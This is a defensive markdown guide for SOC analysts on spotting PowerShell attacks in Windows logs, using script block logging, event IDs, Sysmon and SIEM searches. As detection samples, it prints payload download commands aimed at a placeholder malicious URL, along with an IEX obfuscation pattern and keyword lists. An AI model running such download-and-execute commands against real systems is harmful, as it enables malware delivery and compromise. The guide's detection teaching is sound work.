<p align="center">
  <img src="https://media.giphy.com/media/3o7btPCcdNniyf0ArS/giphy.gif" alt="Log Searching">
</p>


# Detecting PowerShell Attacks by Analyzing Logs

**Guide written by Fazi**

This guide provides a step-by-step approach to detect PowerShell-based attacks by analyzing logs, identifying suspicious commands, and understanding attack patterns. It’s designed for SOC analysts and cybersecurity enthusiasts to trace malicious activities, such as script execution, through PowerShell logs.

---

## 📖 Overview

PowerShell is a powerful tool often exploited by attackers to execute malicious commands, such as fileless malware or remote code execution. By analyzing PowerShell logs, you can identify suspicious activities and respond to potential threats. This guide covers:

- Enabling PowerShell logging.
- Analyzing logs for malicious activity.
- Recognizing common attack patterns.
- Using tools to automate detection.

---

## 🛠️ Step 1: Set Up PowerShell Logging

To detect malicious activity, you must first enable **PowerShell Script Block Logging**. This ensures all executed commands are captured in logs for analysis.

### How to Enable Script Block Logging
You can enable logging via **Group Policy** or by running the following PowerShell command as an administrator:

```powershell
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Name "EnableScriptBlockLogging" -Value 1
```

### Why It’s Important

- **Captures All Commands**: Logs every PowerShell command executed, including obfuscated or encoded ones.
- **Facilitates Tracing**: Makes it easier to identify and investigate potential attacks.

---

## 🔍 Step 2: Locate and Analyze PowerShell Logs

With logging enabled, PowerShell activities are recorded in the Windows Event Viewer. Focus on specific Event IDs to uncover suspicious behavior.

### Where to Find Logs

- Open Event Viewer:
  - Press `Windows + R`, type `eventvwr.msc`, and press Enter.
  - Navigate to **Applications and Services Logs → Microsoft → Windows → PowerShell → Operational**.

### Key Event IDs to Monitor:
- **Event ID 4104**: Records every executed PowerShell command (script block logging).
- **Event ID 4688**: Logs process creation, useful for identifying if PowerShell was launched from an unusual location.

### How to Analyze Logs
- **Filter Logs**: In Event Viewer, filter by Event ID 4104 to focus on PowerShell command executions.
- **Look for Red Flags**:
  - **Base64-Encoded Commands**: Often used to hide malicious actions (e.g., `-EncodedCommand` or `-e` flag).
  - **Suspicious Command Patterns**: Look for the use of `Invoke-Expression (IEX)` or `Invoke-WebRequest` to download payloads.
  - **Execution from Unusual Directories**: If PowerShell is running from temporary folders instead of the default directory (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`), it could indicate suspicious behavior.

---

## 🚨 Step 3: Identify Malicious PowerShell Commands

Attackers often use specific PowerShell commands to execute malicious activities. Here are common patterns to watch for:

### Common Malicious Commands

- **Base64-Encoded Commands**: 
  Attackers encode commands to evade detection.
  Example:
  ```powershell
  powershell.exe -EncodedCommand <encoded_string>
  ```
  Action: Decode Base64 strings using online tools or PowerShell to reveal the original command.

- **Malicious Downloaders**:
  Commands that download and execute payloads from remote servers.
  Example:
  ```powershell
  Invoke-WebRequest -Uri 'http://maliciousurl.com' -OutFile 'malware.exe'
  ```
  or
  ```powershell
  (New-Object Net.WebClient).DownloadString('http://maliciousurl.com')
  ```
  Action: Investigate URLs for malicious activity using tools like VirusTotal.

- **Remote Command Execution**:
  Commands that enable remote control of a system.
  Example:
  ```powershell
  Invoke-Command -ComputerName <target> -ScriptBlock { <malicious_code> }
  ```
  or
  ```powershell
  Enter-PSSession -ComputerName <target>
  ```
  Action: Check for unauthorized remote access attempts.

- **Obfuscated Commands**:
  Commands hidden using environment variables or complex syntax.
  Example:
  ```powershell
  IEX ([String]::Join('', (Get-Item Env:Malicious).Value))
  ```
  Action: Analyze for hidden payloads or scripts.

---

## 🕵️‍♂️ Step 4: Investigate Suspicious Commands
When you identify a suspicious command, follow these steps to investigate further:

- **Decode Encoded Commands**:  
  If a command uses Base64 encoding, decode it to understand its intent.  
  Example: Use PowerShell to decode:
  ```powershell
  [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('<encoded_string>'))
  ```

- **Analyze Command Purpose**:  
  Does the command download a file? Check the URL’s reputation.  
  Does it execute a script? Investigate the script’s actions.

- **Check Execution Context**:  
  Was PowerShell launched from an unusual location?  
  Is the command part of a larger attack chain (e.g., paired with process creation in Event ID 4688)?
<p align="center">
  <img src="https://media.giphy.com/media/xT9IgzoKnwFNmISR8I/giphy.gif" alt="Suspicious Activity Detected">
</p>

---

## 🛠️ Step 5: Use Tools to Automate Detection
Manual log analysis can be time-consuming. Use these tools to streamline the process:

- **Sysmon**:  
  Captures detailed logs, including PowerShell command-line arguments.  
  Setup: Install Sysmon and configure it to log PowerShell events (Event ID 1 for process creation, Event ID 7 for image loading).  
  Use Case: Identify PowerShell executions with suspicious arguments.

- **Splunk or ElasticSearch**:  
  Aggregates logs from multiple systems for centralized analysis.  
  Setup: Ingest PowerShell logs and create dashboards to search for keywords like IEX, Invoke-WebRequest, or Base64 patterns.  
  Use Case: Detect patterns across a network, such as repeated malicious commands.

- **VirusTotal**:  
  Scan URLs or files downloaded by PowerShell commands to confirm malicious intent.  
  Use Case: Verify if a URL in an Invoke-WebRequest command leads to a known malicious site.

---

## ✅ Step 6: Conclusion and Best Practices
Detecting PowerShell attacks requires diligent monitoring of logs and a keen eye for suspicious patterns. Key takeaways:

- **Enable Script Block Logging**: Ensure all PowerShell commands are logged (Event ID 4104).
- **Monitor for Attack Signatures**: Look for encoded commands, suspicious keywords, and unusual execution locations.
- **Automate with Tools**: Use Sysmon, Splunk, or ElasticSearch to scale your detection efforts.

By following these steps, you can identify and respond to PowerShell-based attacks effectively, strengthening your SOC skills.


<p align="center">
  <img src="https://media.giphy.com/media/VbnUQpnihPSIgIXuZv/giphy.gif" alt="Automation Robot">
</p>
 ---

📧 **Contact Me**  
For questions or feedback, reach out to me:  
[Contact Fazi](mailto:f.sgamar222@gmail.com)
```
